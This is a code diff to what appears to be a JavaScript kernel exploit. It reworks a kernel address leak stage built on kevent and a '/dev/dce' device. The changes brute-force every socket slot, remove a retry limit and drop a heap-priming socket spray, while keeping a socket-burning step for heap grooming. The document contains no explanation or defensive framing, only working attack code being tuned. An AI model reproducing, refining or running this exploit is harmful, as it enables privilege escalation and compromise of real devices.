@@ -20,9 +20,6 @@ const TPL_HI = 0x54545454;
 const DEV_DCE = "/dev/dce";
 const OPS_OFF = 0x985a;
 
-const CANDS = [];
-for (let i = 8; i <= 248; i += 8) CANDS.push(i);
-
 const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
 
 function ctx() { return STATE.ctx; }
@@ -216,16 +213,16 @@ function phase2Leak(rootKq, fds) {
   let kva = -1n, pageVal = 0n;
   let tries = 0;
 
+  // Brute-force scan all 256 slots
   for (let attempt = 1; attempt <= 6; attempt++) {
-    if (target >= 0 || tries >= 64) break;
+    if (target >= 0) break;
     log("KV-ATTEMPT", attempt + "/6");
+    
+    // Repack all sockets
     for (const fd of fds) { if (fd !== -1) disarm(fd); }
     for (const fd of fds) { if (fd !== -1) rearm(fd, tpl); }
-    log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);
 
-    for (let ci = 0; ci < CANDS.length && target < 0 && tries < 64; ci++) {
-      const vi = CANDS[ci];
-      if (vi >= fds.length) continue;
+    for (let vi = 0; vi < fds.length && target < 0; vi++) {
       const fd = fds[vi];
       if (fd === -1) continue;
       
@@ -248,8 +245,12 @@ function phase2Leak(rootKq, fds) {
       cl.dv.setInt16(10, 1, true);
       cl.dv.setUint32(16, 90, true);
       let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
-      log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " kevent rc=" + rc);
-      if (rc !== 0) continue;
+      log("KV-PLANT", "idx=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
+      
+      if (rc !== 0) {
+        // If plant failed, re-open dce to keep fd numbers consistent
+        continue; 
+      }
 
       let joined = 0;
       for (let j = 0; j < fds.length; j++) {
@@ -282,14 +283,14 @@ function phase2Leak(rootKq, fds) {
         if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
         else {
           candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt;
-          log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page));
+          log("KV-HELD", "round=" + attempt + " try=" + tries + " idx=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page));
         }
       }
     }
   }
 
   if (kva === -1n) fin("leak scan: no victim held");
-  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx);
+  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " idx=" + candIdx);
   return { kva, page: pageVal, targetFd };
 }
 
@@ -306,17 +307,6 @@ export async function runKevent(c) {
 
   ensureStubs();
 
-  // --- HEAP PRIMER (Normalizes memory addresses) ---
-  log("HEAP-PRIME", "Priming heap...");
-  const primed = [];
-  for (let i = 0; i < 500; i++) {
-    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
-    if (fd >= 0) primed.push(fd);
-  }
-  for (const fd of primed) scn("close", fd);
-  log("HEAP-PRIME", "Closed 500 sockets to reset slab");
-
-  // --- FD BURNER ---
   const burn = [];
   for (let i = 0; i < 250; i++) {
     const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
